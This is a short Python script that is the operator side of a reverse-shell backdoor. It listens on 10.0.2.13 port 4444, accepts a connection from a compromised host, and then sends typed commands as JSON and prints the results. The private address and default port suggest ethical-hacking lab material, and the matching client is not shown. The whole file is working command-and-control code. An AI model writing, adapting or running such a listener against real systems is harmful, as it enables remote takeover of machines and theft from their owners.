import socket
import json


class Listener:
    def __init__(self, ip, port, start=True):
        listener = socket.socket(socket.AF_INET, socket. SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print('[+] Waiting for incoming connections')
        self.connection, address = listener.accept()
        print(f'[+] Got a connection from {address}')
        if start:
            self.run()

    def reliable_send(self, data):
        json_data = json.dumps(data)  # str
        json_data = json_data.encode()  # bytes
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = b''
        while True:
            try:
                json_data += self.connection.recv(1024)  # bytes
                json_data_str = json.loads(json_data)  # str
                return json_data_str
            except ValueError:
                continue

    def execute_remotely(self, command):  # str -> str
        self.reliable_send(command)
        if command[0] == 'exit':
            self.connection.close()
            exit()
        return self.reliable_receive()

    def run(self):
        while True:
            command = input('>> ')  # str
            command = command.strip().split(' ')
            result = self.execute_remotely(command)  # str
            print(result)


Listener('10.0.2.13', 4444)
